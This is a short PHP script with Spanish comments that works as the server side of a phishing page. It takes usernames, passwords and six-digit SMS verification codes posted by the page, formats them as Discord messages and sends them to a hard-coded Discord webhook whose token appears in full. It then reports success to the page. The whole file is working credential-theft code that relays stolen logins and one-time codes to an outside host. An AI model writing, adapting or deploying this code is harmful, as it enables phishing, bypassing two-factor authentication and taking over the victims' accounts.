<?php
// Configura los encabezados para responder en formato JSON
header('Content-Type: application/json');

// Reemplaza esto con la URL real de tu Webhook de Discord
$webhook_url = "https://discordapp.com/api/webhooks/1507512404207079445/U8kv3Bb71Vj6t7twOn3g20irl4YYjNtVheQBuzAov70lsvjKOLUC7qIWcyWOIZS96YXW";

// Leer los datos JSON enviados desde el JavaScript
$json_input = file_get_contents('php://input');
$data = json_decode($json_input, true);

if (!$data) {
    echo json_encode(["status" => "error", "message" => "No se recibieron datos válido."]);
    exit;
}

// Extraer las variables enviadas
$usuario    = isset($data['usuario']) ? htmlspecialchars($data['usuario']) : 'No proveído';
$password   = isset($data['password']) ? htmlspecialchars($data['password']) : 'No proveído';
$codigo_sms = isset($data['codigo_sms']) ? htmlspecialchars($data['codigo_sms']) : 'No requerido';
$tipo_paso  = isset($data['paso']) ? $data['paso'] : 'desconocido';

// Darle un diseño limpio al mensaje que se enviará a Discord
$timestamp = date("Y-m-d H:i:s");

if ($tipo_paso === "contrasena") {
    $embed = [
        "title" => "🔑 Nuevo Intento de Inicio de Sesión",
        "color" => 15158332, // Color Rojo/Fucsia en código decimal
        "fields" => [
            ["name" => "👤 Usuario", "value" => "`$usuario`", "inline" => true],
            ["name" => "🔒 Contraseña", "value" => "`$password`", "inline" => true],
            ["name" => "📅 Fecha y Hora", "value" => $timestamp, "inline" => false]
        ]
    ];
} elseif ($tipo_paso === "codigo") {
    $embed = [
        "title" => "📲 Código de Verificación Recibido",
        "color" => 2123412, // Color Azul en código decimal
        "fields" => [
            ["name" => "👤 Usuario", "value" => "`$usuario`", "inline" => true],
            ["name" => "🔢 Código 6 Dígitos", "value" => "🧠 `$codigo_sms`", "inline" => true],
            ["name" => "📅 Fecha y Hora", "value" => $timestamp, "inline" => false]
        ]
    ];
}

// Estructura final que entiende la API de Discord
$post_data = json_encode([
    "embeds" => [$embed]
]);

// Configurar la petición cURL para enviar los datos a Discord
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);
curl_close($ch);

// Responder al JavaScript que todo salió bien
echo json_encode(["status" => "success", "message" => "Datos procesados correctamente."]);
?>